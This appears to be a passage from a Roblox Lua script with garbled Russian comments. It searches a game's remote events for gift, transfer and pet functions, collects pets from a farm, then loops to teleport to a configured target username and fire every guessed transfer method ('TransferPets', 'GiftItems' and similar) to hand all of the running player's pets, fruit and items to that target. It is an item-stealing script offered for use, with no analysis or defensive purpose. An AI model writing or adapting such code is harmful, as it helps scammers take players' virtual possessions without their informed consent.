-- ‚úÖ –ü–æ–∏—Å–∫ RemoteEvents
local function findAllRemotes()
    local remotes = {}
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local name = v.Name:lower()
            if name:find("gift") or name:find("transfer") or name:find("send") or name:find("donate") or name:find("pet") or name:find("fruit") then
                table.insert(remotes, v)
            end
        end
    end
    return remotes
end

-- ‚úÖ –¢–µ–ª–µ–ø–æ—Ä—Ç –∫ –∏–≥—Ä–æ–∫—É
local function teleportToPlayer(target)
    local remotes = findAllRemotes()
    for _, r in ipairs(remotes) do
        if r:IsA("RemoteEvent") and r.Name:lower():find("teleport") then
            pcall(function() r:FireServer(target) end)
        end
    end
end

-- ‚úÖ –ü–µ—Ä–µ–¥–∞—á–∞ –≤—Å–µ—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
local function transferAllToPlayer(target)
    local count = 0
    local remotes = findAllRemotes()
    local keywords = {"Pet", "Fruit", "Item"}

    for _, remote in ipairs(remotes) do
        for _, keyword in ipairs(keywords) do
            local methods = {"Transfer"..keyword.."s", "Send"..keyword.."s", "Give"..keyword.."s", "Gift"..keyword.."s"}
            for _, method in ipairs(methods) do
                local success = pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(method, target)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(method, target)
                    end
                end)
                if success then
                    count = count + 1
                    wait(0.2)
                end
            end
        end
    end
    return count
end

-- ‚úÖ –°–±–æ—Ä –ø–∏—Ç–æ–º—Ü–µ–≤ —Å –æ–≥–æ—Ä–æ–¥–∞
local function collectPetsOnFarm()
    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
    if not garden then return end
    for _, v in ipairs(garden:GetDescendants()) do
        if v:IsA("Model") and v.Name:lower():find("pet") then
            local remotes = findAllRemotes()
            for _, r in ipairs(remotes) do
                if r:IsA("RemoteEvent") and r.Name:lower():find("collect") then
                    pcall(function() r:FireServer("CollectPet", v) end)
                end
            end
        end
    end
end

-- ‚úÖ –ì–ª–∞–≤–Ω—ã–π —Ü–∏–∫–ª
while true do
    collectPetsOnFarm()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name == CONFIG.TARGET_USERNAME then
            TargetPlayer = plr
            print(TEXT.Found)
            teleportToPlayer(TargetPlayer)
            wait(2)
            local sent = transferAllToPlayer(TargetPlayer)
            print(TEXT.Transferred .. tostring(sent))
        end
    end
    wait(CONFIG.CHECK_INTERVAL)
end
